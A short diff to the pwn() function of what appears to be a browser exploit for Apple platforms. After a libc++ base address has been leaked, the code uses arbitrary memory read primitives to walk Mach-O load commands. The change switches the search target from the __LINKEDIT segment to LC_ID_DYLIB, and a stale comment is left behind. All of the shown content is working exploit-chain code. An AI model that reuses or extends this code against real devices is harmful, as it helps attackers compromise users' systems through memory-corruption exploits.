@@ -312,17 +312,17 @@ function pwn() {
     }
     log(`[+] libcpp_base: ${libcpp1_base}, try_count: ${try_count}`);
     
-    var lc_seg_64 = Add(libcpp1_base, 0x20);
-    var segname;
+    var lc = Add(libcpp1_base, 0x20);
+    var lc_cmd;
     while(true) {
-        segname = read64(Add(lc_seg_64, 0x8))
-        if(segname == 0x44454B4E494C5F5F) {   //__LINKED (__LINKEDIT)
-            log(`[+] Found __LINKEDIT LC_SEGMENT_64 at: ${lc_seg_64}`);
+        lc_cmd = read32(lc)
+        if(lc_cmd == 0xd) {   //__LINKED (__LINKEDIT)
+            log(`[+] Found LC_ID_DYLIB at: ${lc}`);
             break;
         }
 
-        var cmdsize = read32(Add(lc_seg_64, 0x4));
-        lc_seg_64 = Add(lc_seg_64, cmdsize)
+        var cmdsize = read32(Add(lc, 0x4));
+        lc = Add(lc, cmdsize)
     }
 
 
